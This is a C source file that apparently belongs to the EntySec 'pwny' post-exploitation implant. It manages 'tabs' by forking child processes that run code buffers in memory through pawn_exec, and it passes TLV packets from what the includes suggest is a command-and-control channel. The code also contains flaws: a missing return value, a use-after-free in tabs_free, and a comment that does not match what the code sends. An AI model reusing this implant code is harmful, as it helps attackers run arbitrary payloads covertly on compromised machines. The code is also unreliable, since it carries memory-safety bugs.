/*
 * MIT License
 *
 * Copyright (c) 2020-2023 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>

#include <tab.h>
#include <tlv.h>
#include <log.h>
#include <c2.h>
#include <pawn.h>

#include <uthash/uthash.h>

/*
 * Create a tab from buffer.
 */

static int create_tab(tabs_t *tab_new, unsigned char *buffer)
{
    int pipes[2];

    if (pipe(pipes) == -1)
        return -1;

    pid_t pid = fork();

    if (pid == -1)
        return -1;
    else if (pid == 0)
    {
        dup2(pipes[0], STDIN_FILENO);
        char *argv[] = {"pwny"};

        #ifdef LINUX

        pawn_exec(buffer, argv, environ);

        #else
        #ifdef MACOS

        pawn_exec_bundle(buffer, argv, environ);
        #endif
        #endif
    } else
    {
        fcntl(pipes[1], F_SETFL, O_NONBLOCK);

        tab_new->tab_fd = pipes[1];
        tab_new->tab_pid = pid;
    }

    return 0;
}

/*
 * Look through the tabs, find the pool and pass TLV packet to it.
 */

int tab_lookup(tabs_t **tabs_table, int tlv_pool, tlv_pkt_t *tlv_packet)
{
    log_debug("* Searching for tab entry (%d)\n", tlv_pool);

    tabs_t *tabs_new;
    HASH_FIND_INT(*tabs_table, &tlv_pool, tabs_new);

    if (tabs_new != NULL)
    {
        log_debug("* Found tab entry (%d)\n", tlv_pool);
        tlv_channel_send_fd(tabs_new->tab_fd, tlv_packet);

        return 0;
    }

    return -1;
}

/*
 * Add tab with the specific pool from buffer.
 */

void tab_add(tabs_t **tabs_table, int tab_pool, unsigned char *buffer)
{
    tabs_t *tabs_new = calloc(1, sizeof(*tabs_new));

    if (tabs_new != NULL)
    {
        tabs_new->tab_pool = tab_pool;

        if (create_tab(tabs_new, buffer) < 0)
        {
            free(tabs_new);
            return;
        }

        tabs_t *tabs_data_new;
        HASH_FIND_INT(*tabs_table, &tab_pool, tabs_data_new);

        if (tabs_data_new == NULL)
        {
            HASH_ADD_INT(*tabs_table, tab_pool, tabs_new);
            log_debug("* Added tab entry (%d)\n", tab_pool);
        }
    }
}

/*
 * Exit tab and close it's descriptor.
 *
 * NOTE: Sends API_CALL_QUIT to the tab's console.
 */

int tab_exit(tabs_t *tab)
{
    tlv_pkt_t *tlv_packet = tlv_channel_pkt(TLV_NO_CHANNEL);

    tlv_channel_send_fd(tab->tab_fd, tlv_packet);
    close(tab->tab_fd);
}

/*
 * Delete a single tab.
 */

int tab_delete(tabs_t **tabs_table, int tab_pool)
{
    tabs_t *tabs_new;
    HASH_FIND_INT(*tabs_table, &tab_pool, tabs_new);

    if (tabs_new != NULL)
    {
        tab_exit(tabs_new);
        HASH_DEL(*tabs_table, tabs_new);

        log_debug("* Deleted tab entry (%d)\n", tab_pool);
        return 0;
    }

    return -1;
}

/*
 * Free tabs table.
 */

void tabs_free(tabs_t *tabs_table)
{
    tabs_t *tab;

    for (tab = tabs_table; tab != NULL; tab = tab->hh.next)
    {
        tab_exit(tab);

        log_debug("* Freed tab entry (%d)\n", tab->tab_pool);
        HASH_DEL(tabs_table, tab);

        free(tab);
    }

    free(tabs_table);
}
